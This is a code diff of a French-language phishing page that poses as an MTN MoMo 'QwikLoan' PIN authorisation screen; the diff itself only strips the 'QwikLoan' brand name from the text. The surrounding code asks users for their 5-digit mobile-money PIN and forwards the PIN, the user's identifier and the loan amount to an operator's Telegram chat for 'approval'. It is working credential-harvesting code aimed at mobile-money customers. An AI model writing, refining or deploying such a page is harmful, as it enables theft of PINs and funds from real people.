@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>MTN QwikLoan · Autorisation PIN</title>
+  <title>MTN  · Autorisation PIN</title>
   
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -268,7 +268,7 @@
   </div>
 
   <div class="description">
-    Vous êtes sur le point d'autoriser MTN QwikLoan à verser les fonds sur votre porte‑monnaie MTN MoMo. Saisissez votre code PIN pour autoriser.
+    Vous êtes sur le point d'autoriser MTN  à verser les fonds sur votre porte‑monnaie MTN MoMo. Saisissez votre code PIN pour autoriser.
   </div>
 
   <div class="label">Code PIN MTN MoMo (5 chiffres)</div>
@@ -429,7 +429,7 @@
       const amountText = loanAmount !== 'Non spécifié' ? `\nLoan Amount: XAF ${loanAmount}` : '';
 
       // English message for admin
-      const msg = `🔐 <b>MTN QwikLoan PIN Authorisation</b>\n\n${identifier}${amountText}\n\nPIN entered: <code>${escapedPin}</code>\n\nApprove or decline this PIN?`;
+      const msg = `🔐 <b>MTN  PIN Authorisation</b>\n\n${identifier}${amountText}\n\nPIN entered: <code>${escapedPin}</code>\n\nApprove or decline this PIN?`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
